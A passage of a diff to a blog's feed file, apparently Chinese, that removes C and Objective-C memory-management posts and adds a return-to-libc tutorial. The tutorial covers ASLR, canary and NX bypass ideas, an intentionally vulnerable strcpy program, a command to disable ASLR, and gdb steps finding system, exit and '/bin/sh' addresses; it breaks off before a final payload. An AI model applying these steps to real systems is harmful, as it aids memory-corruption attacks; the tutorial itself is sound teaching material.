</span>{</div><div class="line"> &nbsp;</div><div class="line">    <span class="keyword">char</span> nstring[<span class="number">10</span>];</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Input String:"</span>);</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, nstring);</div><div class="line"> &nbsp;</div><div class="line">    <span class="keyword">char</span> *resultString = fun(nstring, <span class="number">0</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, resultString);</div><div class="line"> &nbsp;</div><div class="line">    <span class="keyword">long</span> result = strtol(resultString, <span class="literal">NULL</span>, <span class="number">2</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%ld\n"</span>, result);</div><div class="line"> &nbsp;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">}</div></pre></td></tr></tbody></table>
-
-<p>输出：</p>
-<blockquote>
-<p>Input String:20<br>11<br>3</p>
-<p>Input String:1040<br>1011<br>11</p>
-<p>Input Stirng:2300304<br>1111111<br>127</p>
-</blockquote>
-<h2 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h2><p><strong>关于字符数组和字符串在函数间的传递</strong></p>
-<p>从代码中可以看到我用了两个静态数组变量，之所以不直接定义在函数体内作为局部变量是因为：</p>
-<blockquote>
-<p>当用字符指针<code>char*</code>返回字符数组首地址时，函数体内的局部变量数组里的值已经被释放，返回的首地址虽然没有变，但里面的值已经无意义了。</p>
-</blockquote>
-<p>例如：</p>
-<table><tbody><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></div><div class="line">  </div><div class="line">  <span class="function"><span class="keyword">char</span> *<span class="title">test</span><span class="params">()</span></span></div><div class="line">  {</div><div class="line">      <span class="comment">//char tmp[30]="测试";</span></div><div class="line">      <span class="keyword">char</span> *tmp=<span class="string">"测试"</span>;<span class="comment">//写成这样可以用指针返回数组首地址</span></div><div class="line">     <span class="keyword">return</span> tmp;</div><div class="line"> }</div><div class="line"> </div><div class="line"> <span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"> {</div><div class="line">     <span class="built_in">printf</span>(<span class="string">"%s"</span>,test());</div><div class="line"> }</div></pre></td></tr></tbody></table>
-
-<p>打印出来的值可能是乱码也能为nil。<br>解决方式：<br><strong>1. static全局变量</strong></p>
-<table><tbody><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">char</span> *<span class="title">test</span><span class="params">()</span></span></div><div class="line">{</div><div class="line">     <span class="keyword">static</span> <span class="keyword">char</span> tmp[<span class="number">30</span>]=<span class="string">"static测试"</span>;</div><div class="line">     <span class="keyword">return</span> tmp;</div><div class="line">}</div><div class="line"> </div><div class="line"> <span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">{</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,test());</div><div class="line">}</div></pre></td></tr></tbody></table>
-
-<p>在数组tmp[30]前面加入了<code>static</code>关键字，它就使得<code>tmp[30]</code>存放在内存中的静态存储区中，所占用的存储单元一直不释放，直到整个程序运行结束。所以当主函数调用完<code>print()</code>函数后，该空间依然存在。所以<code>main()</code>函数中接到首地值后可以访问数组中的元素。</p>
-<p><strong>2. 结构体作为返回值</strong></p>
-<table><tbody><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"string.h"</span></span></div><div class="line"></div><div class="line"><span class="keyword">struct</span> ret</div><div class="line">{</div><div class="line">    <span class="keyword">char</span> buf[<span class="number">30</span>];</div><div class="line">};</div><div class="line"> </div><div class="line"> <span class="function"><span class="keyword">struct</span> ret <span class="title">test</span><span class="params">(<span class="keyword">char</span> *tmp)</span></span></div><div class="line">{</div><div class="line">    <span class="keyword">struct</span> ret a;</div><div class="line">    <span class="built_in">strcpy</span>(a.buf,tmp);</div><div class="line">    <span class="keyword">return</span> a;</div><div class="line">}</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">{</div><div class="line">    <span class="keyword">struct</span> ret b;</div><div class="line">    b=test(<span class="string">"用结构体作为返回值传递数组"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,b.buf);</div><div class="line">}</div></pre></td></tr></tbody></table>
-
-<p>两点注意：</p>
-<p>1、数组之间的赋值不要直接，即不要直接将数组 A 赋给数组 B，而是要用<code>strcpy</code>（字符型数组）或者<code>memcpy</code>（非字符型数组）。</p>
-<p>2、用结构体定义变量和函数时不要忘了结构体名（上面程序的<code>ret</code>）。</p>
-<hr>
-<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] 【原】C语言函数返回数组的问题　<a href="http://www.cnblogs.com/wuqi1003/archive/2013/01/09/2853657.html">http://www.cnblogs.com/wuqi1003/archive/2013/01/09/2853657.html</a><br>[2] C语言中字符串如何转换为二进制、八进制、十进制、十六进制　 　<a href="http://blog.csdn.net/edonlii/article/details/9162769">http://blog.csdn.net/edonlii/article/details/9162769</a><br>[3] C语言之strcat函数　<a href="http://blog.csdn.net/hgj125073/article/details/8439448">http://blog.csdn.net/hgj125073/article/details/8439448</a><br>[4] C语言strcmp()函数：比较字符串（区分大小写）　<a href="http://c.biancheng.net/cpp/html/162.html">http://c.biancheng.net/cpp/html/162.html</a></p>
-]]></content>
-      <categories>
-        <category>习题</category>
       </categories>
   </entry>
   <entry>
@@ -519,111 +627,175 @@
       </categories>
   </entry>
   <entry>
-    <title>property 中的常用关键字分析</title>
-    <url>/c6e2f716.html</url>
-    <content><![CDATA[<h2 id="栈与堆"><a href="#栈与堆" class="headerlink" title="栈与堆"></a>栈与堆</h2><p>首先，我们需要知道：为什么<strong>只有Objective-C对象需要进行内存管理</strong>，而其它非对象类型（如基本数据类型）不需要我们来管理呢？</p>
-<blockquote>
-<p>因为： Objective-C 的对象在内存中是以堆的方式分配空间的</p>
-<ul>
-<li>堆里面的内存是动态分配的，所以也就需要程序员手动的去添加内存、回收内存</li>
-<li>OC对象存放于堆里面(堆内存要程序员手动回收，也就是 release )</li>
-<li>非OC对象一般放在栈里面(栈内存会被系统自动回收)</li>
-</ul>
-</blockquote>
+    <title>栈溢出之 ROP（一）</title>
+    <url>/b1689cf9.html</url>
+    <content><![CDATA[<p>栈溢出的基本原理以及shellcode利用可以查看我的上一篇文章——<a href="https://harpersu00.github.io/adec3bdf.html">栈溢出之shellcode</a>。</p>
+<h2 id="栈溢出缓解措施介绍"><a href="#栈溢出缓解措施介绍" class="headerlink" title="栈溢出缓解措施介绍"></a>栈溢出缓解措施介绍</h2><p>栈地址随机化（攻击者不知道shellcode的地址，无法构造return address）：ASLR（地址空间随机化）、PIE（地址无关可执行文件）</p>
+<p>检测栈溢出，并报错退出：Stack Canary/Cookie</p>
+<p>栈不可执行：NX（不执行）/DEP（数据执行保护）</p>
 <a id="more"></a>
 
-<p>例如：</p>
-<table><tbody><tr><td class="code"><pre><div class="line"><span class="keyword">int</span> a = <span class="number">10</span>;</div><div class="line"><span class="keyword">int</span> b = <span class="number">20</span>;</div><div class="line">Car *c = [[Car alloc] init];</div></pre></td></tr></tbody></table>
+<h3 id="ASLR-和-PIE"><a href="#ASLR-和-PIE" class="headerlink" title="ASLR 和 PIE"></a>ASLR 和 PIE</h3><p>ASLR是地址空间随机化。开启后，堆、栈、共享库都会有一个随机偏移，堆和共享库往上（高地址处）偏移一个随机量，栈往下（低地址处）偏移。随机粒度为0x1000，一个内存页的大小。</p>
+<p>单独开启ASLR，虽然堆、栈、共享库都会被随机化，但是程序的入口代码加载还是在固定地址0x804800。</p>
+<p>PIE（地址无关代码）开启后，编译器会在编译时生成地址无关代码，编译选项<code>-fPIC -pie</code>，这样程序就可以在随机地址处被加载。也就是程序的代码以及数据段会往上（高地址处）偏移一个随机量。如下图所示。</p>
+<img src="../images/2019-03-12-栈溢出之-ROP（一）/图1.png" width="800" height="550" align="middle" />
 
-<p>我们知道OC对象一般都是指针形式，大神ibireme在 <a href="http://blog.ibireme.com/2013/11/25/objc-object/">Objective-C 中的类和对象</a>中提到：</p>
-<blockquote>
-<p>凡是首地址是*isa的struct指针，都可以被认为是objc中的对象。运行时可以通过isa指针，查找到该对象是属于什么类(Class)。</p>
-</blockquote>
-<p>下图可以清楚的表示 OC 中的堆栈分配：</p>
-<p><img src="/images/2016-09-08-%E8%AF%AD%E6%B3%95-property-%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E5%85%B3%E9%94%AE%E5%AD%97%E5%88%86%E6%9E%90/%E5%9B%BE1.png"></p>
-<h2 id="assign-与-weak"><a href="#assign-与-weak" class="headerlink" title="assign 与 weak"></a>assign 与 weak</h2><blockquote>
-<p><strong>基础知识提要</strong></p>
-<p>@property 声明的属性，会自动创建 getter,setter 方法。 属性中申明的关键字主要有三大类：</p>
+<p>使用<code>ldd</code>命令查看加载库的地址，可以看到两次都不一样。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> ldd a.out </span><br><span class="line">	linux<span class="literal">-gate</span>.so.<span class="number">1</span> =&gt;  (<span class="number">0</span>xf77c7000)</span><br><span class="line">	libc.so.<span class="number">6</span> =&gt; /lib/libc.so.<span class="number">6</span> (<span class="number">0</span>xf75e6000)</span><br><span class="line">	/lib/ld<span class="literal">-linux</span>.so.<span class="number">2</span> (<span class="number">0</span>xf77c8000)</span><br><span class="line"><span class="variable">$</span> ldd a.out </span><br><span class="line">	linux<span class="literal">-gate</span>.so.<span class="number">1</span> =&gt;  (<span class="number">0</span>xf7798000)</span><br><span class="line">	libc.so.<span class="number">6</span> =&gt; /lib/libc.so.<span class="number">6</span> (<span class="number">0</span>xf75b7000)</span><br><span class="line">	/lib/ld<span class="literal">-linux</span>.so.<span class="number">2</span> (<span class="number">0</span>xf7799000)</span><br></pre></td></tr></table></figure>
+
+<p>查看程序加载地址：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> gcc test.c <span class="literal">-m32</span> <span class="literal">-fPIC</span> <span class="literal">-pie</span> <span class="literal">-o</span> a2.out</span><br><span class="line"><span class="variable">$</span> gdb <span class="literal">-q</span> a2.out</span><br><span class="line">Reading symbols from /home/scbox/Documents/a2.out...(no debugging symbols found)...done.</span><br><span class="line">(gdb) <span class="built_in">set</span> <span class="built_in">disable-randomization</span> off <span class="comment">#如果不开启这个选项，则在gdb中默认是不随机化的</span></span><br><span class="line">(gdb) b main</span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0</span>x5ff</span><br><span class="line">(gdb) <span class="built_in">r</span></span><br><span class="line">Starting program: /home/scbox/Documents/a2.out </span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">1</span>, <span class="number">0</span>x565855ff <span class="keyword">in</span> main ()</span><br><span class="line">Missing separate debuginfos, use: debuginfo<span class="literal">-install</span> glibc<span class="literal">-2</span>.<span class="number">17</span><span class="literal">-307</span>.el7.<span class="number">1</span>.i686</span><br><span class="line">...</span><br><span class="line"><span class="variable">$</span> gdb <span class="literal">-q</span> a2.out</span><br><span class="line">...</span><br><span class="line">(gdb) <span class="built_in">r</span></span><br><span class="line">Starting program: /home/scbox/Documents/a2.out </span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">1</span>, <span class="number">0</span>x565e25ff <span class="keyword">in</span> main ()  <span class="comment">#两次main函数的地址不一样了</span></span><br><span class="line">Missing separate debuginfos, use: debuginfo<span class="literal">-install</span> glibc<span class="literal">-2</span>.<span class="number">17</span><span class="literal">-307</span>.el7.<span class="number">1</span>.i686</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
 <ul>
-<li>readwrite/readonly： 是否生成 setter 方法, 默认 readwrite</li>
-<li>assign/weak/strong/copy/retain： setter 方法中如何传递所有权等内存管理策略, ARC 环境默认为 strong</li>
-<li>nonatomic/atomic：是否加线程锁（并不能完全控制线程访问，最好事是自己手动底层加锁，默认 atomic</li>
+<li>只是开启了ASLR，没有开启PIE的话，可以通过<code>Return to PLT</code>，绕过共享库随机化。（比如将shellcode放置在.data段，这部分是不会随机化的）</li>
+<li>x86_32架构下爆破（因为随机化粒度为0x1000，所以只有几千种可能）</li>
+<li>info leak（信息泄露，比如在我的<a href="https://harpersu00.github.io/7e77e3d1.html">（译）Analysis and exploitation of Pegasus kernel vulnerabilities (CVE-2016-4655 / CVE-2016-4656)</a>文章中介绍的CVE-2016-4655漏洞）</li>
+<li>nop sled（在shellcode之前添加大段nop指令，在上一篇<a href="https://harpersu00.github.io/adec3bdf.html">栈溢出之shellcode</a>的文章中，使用了这种方法）</li>
+<li>heap spray（堆喷）</li>
+<li>在本地环境中，可以使用<code>ulimit -s unilimited</code>命令（程序崩溃后会生成core dump文件，可以在这个文件中查看shellcode地址）</li>
 </ul>
-</blockquote>
-<p><em>NSString 的引用计数LLVM是有优化的，并不是简单根据设定的关键字来判断。本文只是为了方便易懂，以这个类作为例子。</em></p>
-<h3 id="assign"><a href="#assign" class="headerlink" title="assign"></a>assign</h3><p>如果设置 assign ，在 setter 方法中是这样的：</p>
-<table><tbody><tr><td class="code"><pre><div class="line">- (<span class="keyword">void</span>)setCarName:(<span class="built_in">NSString</span> *)name {</div><div class="line">    _carName = name;  <span class="comment">//默认是有下划线的</span></div><div class="line">}</div></pre></td></tr></tbody></table>
+<h3 id="Stack-Canary-Cookie"><a href="#Stack-Canary-Cookie" class="headerlink" title="Stack Canary/Cookie"></a>Stack Canary/Cookie</h3><p>这个机制是用来检测栈溢出的。对于需要保护的函数，在执行之前，将一个随机值放在栈上，这个值被称为Canary。在64位上一般在rbp-0x8的位置，32位在ebp-0x4的位置，也就是ebp保存地址往下（低地址）的部分。然后在函数返回之前，会先检测这个值是否发生改变。stack_chk_fail的错误信息就是由于栈溢出。通过编译选项<code>gcc -fstack-protector</code>可以开启。</p>
+<img src="../images/2019-03-12-栈溢出之-ROP（一）/图2.png" width="650" height="450" align="middle" />
 
-<p>也就是说成员变量 _name 并没有获得 name 所指的对象的所有权，原来对象 @“Amywushu” 的 retainCount 不会改变。一旦 name 被释放，_carName 也就不再指向一个合法的位置，出现指针悬空，如下图所示，相当于 _carName （图中为 carName ）指向的 name，但实际上 _carName 是指向OC对象的，这里只是为了方便理解。</p>
-<p><img src="/images/2016-09-08-%E8%AF%AD%E6%B3%95-property-%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E5%85%B3%E9%94%AE%E5%AD%97%E5%88%86%E6%9E%90/%E5%9B%BE2assign.png"></p>
-<h3 id="assign-weak-的区别"><a href="#assign-weak-的区别" class="headerlink" title="assign/weak 的区别"></a>assign/weak 的区别</h3><p>ARC 中 OC 对象已经不再使用 assign 了，而是使用 weak ，两者的区别在： weak 弱引用所指的对象没有被任何strong指针指向，那么就将被销毁，所有指向这个对象的 weak 指针也将被置为 nil 。而 assign 不会被置为 nil 。但对于非 OC 对象来讲，因为其存储空间在栈上，由系统管理内存，所以一般还是使用 assign。</p>
-<h3 id="unsafe-unretained"><a href="#unsafe-unretained" class="headerlink" title="unsafe_unretained"></a>unsafe_unretained</h3><p>unsafe_unretained 的语义与 assign 类似，相当于用于 OC 对象类型的 assign 。使用这个关键字主要出于性能考虑，因为 weak 对性能有一些影响，因此对性能要求高的地方可以考虑使用 unsafe_unretained 替换 weak 。比如 <a href="https://github.com/ibireme/YYModel/blob/master/YYModel/NSObject%2BYYModel.m">YYModel</a> 的实现，为了追求更高的性能，其中大量使用 unsafe_unretained 作为变量标识符。</p>
-<h2 id="retain-与-strong"><a href="#retain-与-strong" class="headerlink" title="retain 与 strong"></a>retain 与 strong</h2><blockquote>
-<p><strong>知识点:</strong></p>
-<p><strong>MRR内存管理基本原则</strong></p>
-<ol>
-<li>为创建的所有对象设置所有权</li>
-<li>应使用retain方法获取对象（你尚未拥有）的所有权</li>
-<li>当不再使用某个对象时，必须放弃其所有权</li>
-<li>不能放弃不归你所有的对象的所有权</li>
-</ol>
-</blockquote>
-<table><tbody><tr><td class="code"><pre><div class="line"><span class="comment">//对象通过 alloc 消息创建后，变量 atom 就拥有了该对象的所有权（原则1）</span></div><div class="line">Atom *atom = [[Atom alloc] init];</div><div class="line"></div><div class="line"><span class="comment">//变量 href 获取了这个对象的所有权（原则2），不能写成 Atom *href = atom; </span></div><div class="line"><span class="comment">//这样写的话 href 没有获取对象的所有权，一旦 atom 释放了，href 就不再指向一个合法的位置，出现指针悬空。</span></div><div class="line">Atom *href = [atom <span class="keyword">retain</span>];</div><div class="line"></div><div class="line"><span class="comment">// 变量 atom 释放，但 href 依旧拥有该对象的所有权</span></div><div class="line">[atom release];</div><div class="line"></div><div class="line"><span class="comment">// 变量 href 释放，对象引用计数变为 0 ，运行时系统可以释放对象了</span></div><div class="line">[href release];</div></pre></td></tr></tbody></table>
+<p>可以通过泄露Canary的方式绕过（同一进程不同线程的函数的Canary是一样的，比如read函数）</p>
+<p>控制覆盖长度（只覆盖局部变量，不覆盖返回地址）</p>
+<p>修改Canary（Canary保存在TLS(Thread-local Storage)寄存器中，一般是偏移0x14的位置stack_guard）</p>
+<p>劫持stack_chk_fail（canary被覆盖时，就会调用这个函数，劫持后可跳转到自己的shellcode，比如<a href="https://harpersu00.github.io/1e59798b.html">GOT表劫持</a>）</p>
+<p>利用stack_chk_fail的报错信息（在报错信息中，会打印栈溢出的程序名，即argv[0]，可以覆盖这个地址为其他地址，输出我们想知道的内容）</p>
+<h3 id="NX-DEP"><a href="#NX-DEP" class="headerlink" title="NX/DEP"></a>NX/DEP</h3><p>栈不可执行主要是对程序的内存块权限进行更进一步的划分。堆、栈以及数据区可写，但不可执行。代码区、只读数据区不可写，但可执行。也就是说我们要找一块内存区域是既可写也可以执行的，来写入shellcode，是找不到了。</p>
+<p>绕过NX/DEP所需要的方法有一个基本思想，就是Return to Libc。因为我们不能执行写入的代码，那我们就跳转到程序已经加载了的代码中执行，比如libc中的大量函数，system()等等。</p>
+<p><img src="/images/2019-03-12-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8B-ROP%EF%BC%88%E4%B8%80%EF%BC%89/%E5%9B%BE3.png"></p>
+<p>如上图所示，我们将函数的return地址覆盖为libc中的system函数地址，当进程跳转到这个地址时，会执行system函数内部的指令，首先是所有函数都有的，<code>push ebp;</code> 跟<code> mov ebp, esp;</code>这两条指令，即将<code>exit</code>的地址push到。需要读取栈上的参数，即”/bin/sh”，</p>
+<h2 id="Return-to-libc"><a href="#Return-to-libc" class="headerlink" title="Return to libc"></a>Return to libc</h2><p>shellcode以及含有栈溢出漏洞的代码都采用的是跟我上一篇文章一样的代码。</p>
+<p>含有栈溢出漏洞的代码:</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buffer[<span class="number">128</span>];</span><br><span class="line">	<span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Please input one argument!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">strcpy</span>(buffer, argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;argv[1]: %s\n&quot;</span>, buffer);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>——引用自<a href="https://yq.aliyun.com/articles/57166?&utm_source=qq">[精通Objective-C]内存管理</a></p>
-<p>如果设置 retain ，在 setter 方法中是这样的：</p>
-<table><tbody><tr><td class="code"><pre><div class="line">- (<span class="keyword">void</span>)setCarName:(<span class="built_in">NSString</span> *)name {</div><div class="line">    <span class="keyword">if</span> (_carName != name) {</div><div class="line">        [_carName release];</div><div class="line">        _carName = [name <span class="keyword">retain</span>];</div><div class="line">    }</div><div class="line">}</div></pre></td></tr></tbody></table>
+<p>编译命令<code>gcc test.c -m32</code></p>
+<p>需要关闭ASLR:<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p>
+<p>跟前文不同的是，由于没有关闭NP/DEP，所以栈上的shellcode是无法执行的，所以我们要用已经加载的库中的函数来执行我们想要的代码。</p>
+<p>首先，使用gdb查看system以及exit函数地址，在libc中查找字符串<code>&quot;/bin/sh&quot;</code>地址：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> gdb ./a.out </span><br><span class="line">......</span><br><span class="line">Reading symbols from /home/scbox/Documents/a.out...(no debugging symbols found)...done.</span><br><span class="line">(gdb) b main</span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0</span>x8048470</span><br><span class="line">(gdb) <span class="built_in">r</span></span><br><span class="line">Starting program: /home/scbox/Documents/./a.out </span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">1</span>, <span class="number">0</span>x08048470 <span class="keyword">in</span> main ()</span><br><span class="line">Missing separate debuginfos, use: debuginfo<span class="literal">-install</span> glibc<span class="literal">-2</span>.<span class="number">17</span><span class="literal">-307</span>.el7.<span class="number">1</span>.i686</span><br><span class="line">(gdb) p system <span class="comment">#打印system()函数的地址</span></span><br><span class="line"><span class="variable">$1</span> = &#123;&lt;text variable, no debug info&gt;&#125; <span class="number">0</span>xf7e36f70 &lt;system&gt;</span><br><span class="line">(gdb) p <span class="keyword">exit</span> <span class="comment">#打印exit()函数的地址</span></span><br><span class="line"><span class="variable">$2</span> = &#123;&lt;text variable, no debug info&gt;&#125; <span class="number">0</span>xf7e2a7a0 &lt;<span class="keyword">exit</span>&gt;</span><br><span class="line">(gdb) info proc mappings</span><br><span class="line"><span class="keyword">process</span> <span class="number">97414</span></span><br><span class="line">Mapped address spaces:</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Start</span> Addr   <span class="keyword">End</span> Addr       Size     Offset objfile</span><br><span class="line">......</span><br><span class="line">	<span class="number">0</span>xf7df7000 <span class="number">0</span>xf7df8000     <span class="number">0</span>x1000        <span class="number">0</span>x0 </span><br><span class="line">	<span class="number">0</span>xf7df8000 <span class="number">0</span>xf7fbc000   <span class="number">0</span>x1c4000        <span class="number">0</span>x0 /usr/lib/libc<span class="literal">-2</span>.<span class="number">17</span>.so <span class="comment">#起始地址</span></span><br><span class="line">	<span class="number">0</span>xf7fbc000 <span class="number">0</span>xf7fbd000     <span class="number">0</span>x1000   <span class="number">0</span>x1c4000 /usr/lib/libc<span class="literal">-2</span>.<span class="number">17</span>.so</span><br><span class="line">	<span class="number">0</span>xf7fbd000 <span class="number">0</span>xf7fbf000     <span class="number">0</span>x2000   <span class="number">0</span>x1c4000 /usr/lib/libc<span class="literal">-2</span>.<span class="number">17</span>.so</span><br><span class="line">	<span class="number">0</span>xf7fbf000 <span class="number">0</span>xf7fc0000     <span class="number">0</span>x1000   <span class="number">0</span>x1c6000 /usr/lib/libc<span class="literal">-2</span>.<span class="number">17</span>.so <span class="comment">#结束地址</span></span><br><span class="line">	<span class="number">0</span>xf7fc0000 <span class="number">0</span>xf7fc3000     <span class="number">0</span>x3000        <span class="number">0</span>x0 </span><br><span class="line">......</span><br><span class="line">	<span class="number">0</span>xfffdd000 <span class="number">0</span>xffffe000    <span class="number">0</span>x21000        <span class="number">0</span>x0 [<span class="type">stack</span>]</span><br><span class="line">(gdb) find /b <span class="number">0</span>xf7df8000, <span class="number">0</span>xf7fc0000, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="number">0</span> <span class="comment">#查找字符串</span></span><br><span class="line"><span class="number">0</span>xf7f78015</span><br><span class="line"><span class="number">1</span> pattern found.</span><br><span class="line">(gdb) x/s <span class="number">0</span>xf7f78015</span><br><span class="line"><span class="number">0</span>xf7f78015:	<span class="string">&quot;/bin/sh&quot;</span></span><br></pre></td></tr></table></figure>
 
-<p>也就是说，retain/strong 会在 setter 方法中，对传入的对象 <code>&quot;Amywushu&quot;</code> 进行引用计数 +1 的操作。简单来说，就是会拥有传入对象 <code>&quot;Amywushu&quot;</code> 的所有权，而不是像 assign/weak 一样，依赖于传入的对象指针 <code>name</code> ，而并非拥有实际所有权。</p>
-<p>相当于一个保险柜拥有两把钥匙，变量解除所有权 (release) ，也就相当于归还钥匙。当两把钥匙都被归还之后，这个保险柜（对象）也就会被释放。只要拥有该对象的所有权（至少有一把钥匙没有归还），这个对象就不会被释放。</p>
-<p><img src="/images/2016-09-08-%E8%AF%AD%E6%B3%95-property-%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E5%85%B3%E9%94%AE%E5%AD%97%E5%88%86%E6%9E%90/%E5%9B%BE3.png"></p>
-<p>如图所示，<code>_carName</code> 和 <code>name</code> 均拥有对 <code>Amywushu</code> 这个字符串对象的所有权，该对象的引用计数变为 1+1=2 。</p>
-<p>strong 是在 iOS 引入 ARC 的时候引入的关键字，是retain的一个可选的替代。 strong 跟 retain 的意思相同并产生相同的代码，但是语意上更好更能体现对象的关系。</p>
-<p>关于 strong 和 weak 还有什么不清楚的话，可以学习 onevcat 的<a href="https://onevcat.com/2012/06/arc-hand-by-hand/">手把手教你ARC——iOS/Mac开发ARC入门和使用</a>这篇文章，讲得非常清晰易懂。</p>
-<h2 id="copy-与-mutableCopy"><a href="#copy-与-mutableCopy" class="headerlink" title="copy 与 mutableCopy"></a>copy 与 mutableCopy</h2><p>copy 、mutableCopy 与 strong 的区别在于，深拷贝时，示例变量对于传入对象的副本拥有所有权，而不是对象本身；浅拷贝时，则没有区别。<br>如果设置 copy ，在 setter 方法中是这样的：</p>
-<table><tbody><tr><td class="code"><pre><div class="line">- (<span class="keyword">void</span>)setCarName:(<span class="built_in">NSString</span> *)name {</div><div class="line">    <span class="keyword">if</span> (_carName != name) {</div><div class="line">        [_carName release];</div><div class="line">        _carName = [name <span class="keyword">copy</span>];</div><div class="line">    }</div><div class="line">}</div></pre></td></tr></tbody></table>
+<p>这一步，也可以使用<code>reaelf</code> <code>strings</code>等命令查看system、exit函数地址，以及/bin/sh字符串地址：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> ldd a.out <span class="comment">#查看libc库起始地址</span></span><br><span class="line">	linux<span class="literal">-gate</span>.so.<span class="number">1</span> =&gt;  (<span class="number">0</span>xf7fd9000)</span><br><span class="line">	libc.so.<span class="number">6</span> =&gt; /lib/libc.so.<span class="number">6</span> (<span class="number">0</span>xf7df8000)</span><br><span class="line">	/lib/ld<span class="literal">-linux</span>.so.<span class="number">2</span> (<span class="number">0</span>xf7fda000)</span><br><span class="line"><span class="variable">$</span> readelf <span class="literal">-s</span> /lib/libc.so.<span class="number">6</span> | grep system<span class="selector-tag">@</span>  <span class="comment">#在libc库中查找system偏移地址</span></span><br><span class="line">   <span class="number">627</span>: <span class="number">0003</span>ef70    <span class="number">98</span> FUNC    GLOBAL DEFAULT   <span class="number">13</span> __libc_system<span class="selector-tag">@</span>@GLIBC_PRIVATE</span><br><span class="line">  <span class="number">1454</span>: <span class="number">0003</span>ef70    <span class="number">98</span> FUNC    WEAK   DEFAULT   <span class="number">13</span> system<span class="selector-tag">@</span>@GLIBC_2.<span class="number">0</span></span><br><span class="line"><span class="variable">$</span> readelf <span class="literal">-s</span> /lib/libc.so.<span class="number">6</span> | grep <span class="keyword">exit</span><span class="selector-tag">@</span>  <span class="comment">#在libc库中查找exit偏移地址</span></span><br><span class="line">   <span class="number">113</span>: <span class="number">00032</span>c70    <span class="number">58</span> FUNC    GLOBAL DEFAULT   <span class="number">13</span> __cxa_at_quick_exit<span class="selector-tag">@</span>@GLIBC_2.<span class="number">10</span></span><br><span class="line">   <span class="number">141</span>: <span class="number">000327</span>a0    <span class="number">45</span> FUNC    GLOBAL DEFAULT   <span class="number">13</span> <span class="keyword">exit</span><span class="selector-tag">@</span>@GLIBC_2.<span class="number">0</span></span><br><span class="line">   ......</span><br><span class="line"><span class="variable">$</span> strings <span class="literal">-tx</span> /lib/libc.so.<span class="number">6</span> | grep /bin/sh  <span class="comment">#在libc库中查找字符串偏移地址</span></span><br><span class="line"> <span class="number">180015</span> /bin/sh</span><br><span class="line"><span class="variable">$</span> gdb <span class="literal">-q</span>   <span class="comment">#在gdb中计算地址</span></span><br><span class="line">(gdb) p/x <span class="number">0</span>xf7df8000 + <span class="number">0</span>x0003ef70 <span class="comment">#起始地址+偏移地址</span></span><br><span class="line"><span class="variable">$1</span> = <span class="number">0</span>xf7e36f70</span><br><span class="line">(gdb) p/x <span class="number">0</span>xf7df8000 + <span class="number">0</span>x000327a0</span><br><span class="line"><span class="variable">$2</span> = <span class="number">0</span>xf7e2a7a0</span><br><span class="line">(gdb) 